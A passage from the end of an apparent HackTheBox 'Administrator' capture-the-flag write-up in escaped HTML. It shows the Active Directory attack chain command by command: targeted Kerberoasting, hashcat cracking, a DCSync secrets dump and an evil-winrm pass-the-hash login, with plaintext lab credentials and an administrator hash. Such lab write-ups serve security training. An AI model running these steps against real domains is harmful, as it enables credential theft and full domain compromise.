&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo ./targetedKerberoast.py -v -d &lt;span class="s1">&amp;#39;administrator.htb&amp;#39;&lt;/span> -u &lt;span class="s1">&amp;#39;EMILY&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&amp;#39;&lt;/span> --dc-ip 10.10.11.42
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-20.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-21.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h5 id="switching-back-to-your-local-time-">SWITCHING BACK TO YOUR LOCAL TIME :&lt;/h5>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo ntpdate pool.ntp.org
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">timedatectl status
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-22.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="8-cracking-the-hash-of-ethan">8. CRACKING THE HASH OF ETHAN:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">hashcat -m &lt;span class="m">13100&lt;/span> ethan.hash /usr/share/wordlists/rockyou.txt --force -r /usr/share/hashcat/rules/best64.rule
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-23.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>Username: &lt;em>ethan&lt;/em>&lt;br>
Password: &lt;strong>limpbizket&lt;/strong>&lt;/p>
&lt;p>Again, we tried evil winrm as ethan but no access.&lt;/p>
&lt;p>Time to check Ethan privileges.&lt;/p>
&lt;h5 id="bloodhound">BLOODHOUND:&lt;/h5>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-24.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We can see that the user ethan has &lt;strong>DCSync&lt;/strong> Write over the DC. Hence we can dump its &lt;strong>sam&lt;/strong> &lt;em>impacket-secretsdump.py&lt;/em>&lt;/p>
&lt;h2 id="9-dumping-the-sam-via-secretsdump-dcsync">9. DUMPING THE SAM VIA SECRETSDUMP (DCSync):&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo impacket-secretsdump &lt;span class="s1">&amp;#39;administrator.htb/ethan:limpbizkit@10.10.11.42&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-25.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-26.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="10-evil-winrm-as-administrator">10. EVIL WINRM AS ADMINISTRATOR:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">evil-winrm -i 10.10.11.42 -u &lt;span class="s1">&amp;#39;administrator&amp;#39;&lt;/span> -H &lt;span class="s1">&amp;#39;3dc553ce4b9fd20bd016e098d2d2fd2e&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-30.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-31.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h3 id="alhamdulillah">ALHAMDULILLAH&lt;/h3>
&lt;h5 id="rooted">#ROOTED&lt;/h5></description></item></channel></rss>